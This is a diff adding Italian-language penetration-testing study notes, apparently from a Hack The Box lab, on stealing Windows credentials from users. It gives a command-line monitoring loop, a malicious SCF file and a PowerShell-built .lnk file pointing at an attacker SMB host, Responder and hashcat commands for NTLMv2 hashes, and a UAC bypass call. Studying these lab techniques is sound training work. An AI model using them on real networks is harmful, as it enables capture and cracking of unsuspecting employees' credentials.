@@ -1290,3 +1290,76 @@ proviamo con:
 PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
 PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
 ```
+
+# Interacting with Users
+Spesso gli utenti sono l' annello piu' debole dell' organizzazione.
+
+Un impiegato stressato puo' non notare cose strane nella sua macchina o eseguire file o cliccare su link.
+
+Windows ha un' attack surface gigante, quando abbiamo esaurito le opzioni possiamo guardare a tecniche specifiche per rubare credenziali da un utente che non se l' aspetta.
+
+## Traffic Capture
+Se wireshark e' installato utenti non privilegiati possono catturare il traffico. 
+
+il tool **net-cred** (https://github.com/DanMcInerney/net-creds) puo' essere tunnato per sniffare password e hash da un interfaccia live o un file pcap.
+
+Si puo' lasciare questo tool runnare in background durante tutto l'assesment.
+
+## Process Command Lines
+
+Possiamo runnare uno script che analizza tutto cio' che viene eseguito in command line
+
+```
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+```
+Monitora ogni 2 secondi cio' che viene scritto in command line.
+
+## Vulnerable Services
+
+Possiamo incontrare situazioni dove abbiamo un host che esegue un app vulnerabile che possiamo usare per PrivEsc.
+
+## SCF on a File Share
+SCF Shell Command File e' usato da windows explorer per muoversi su e giu per le directories.
+UN file SCF puo' essere manipolato per avere il file Icona che punta ad un UNC path specifico e startare.
+
+Se mettiamo il file icona ad un Server SMB che controlliamo e fargli runnare un tool tipo Responder, Inveigh, or InveighZero, possiamo spesso catturare NTLMv2 password hash per ogni utente che browsa la share.
+
+Puo' essere molto utile se possiamo  avere write access alla share.
+
+### Malicious SCF File
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+### Starting Responder
+`j4k1dibe@htb[/htb]$ sudo responder -wrf -v -I tun0` startiamo Responder e aspettiamo che un utente navighi nella share.
+
+### Cracking NTLMv2 hash with Hashcat
+`j4k1dibe@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`
+
+## Capturing Hashes with Malicious .lnk File
+
+SCFs non funzion piu' sui Server 2019 ma possiamo fare la stessa cosa con i file **.lnk**  semore costringendo a caricare un file nel nostro server SMB
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
